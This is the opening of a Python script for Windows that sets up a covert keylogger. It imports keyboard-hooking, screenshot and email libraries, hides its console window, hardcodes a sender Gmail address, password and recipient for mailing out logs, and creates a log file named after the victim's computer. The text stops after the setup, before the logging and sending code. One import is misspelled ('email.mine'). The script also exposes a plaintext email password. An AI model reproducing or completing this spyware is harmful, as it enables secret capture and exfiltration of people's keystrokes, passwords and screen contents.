# ----------- Modules -----------
import win32api
import win32console
import win32gui

import pythoncom
import pyHook

import socket

import shutil
import os
import platform
import sys

from urllib import urlopen

import smtplib
from email.mine.image import MIMEImage
from email.mine.multipart import MIMEMultipart
from email.mime.text import MIMEText

import ImageGrab

from time import strftime
import time

import threading
from threading import Thread
#-------------------------------

#-------Make window invisible---
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
#------------------------------

#-------Variables----
global Sender, To, Date, Time, Date_Time, log_file
Sender = 'tokivena@gmail.com'
To = 'elie_louis@hotmail.com'
password = 'iamahuman1234'
Date = strftime("%a %d %b %Y")
Time = strftime("%H %M:%S %p")
Date_Time = strftime("(%a %D %b %Y) (%H %M %S %p)")
log_file = 'Log_File @ ['+win32api.GetComputerName()+']@'+strftime("[(%a %d %b %Y) (%H %M %S %p)]")+'.txt'
#----------------------------------------------

f = open(log_file, 'w')
line = '=================================='
f.write(line+'\n >>> Logging Started @' + Time + '@' + Date +'\n'+line+'\n\n')

    
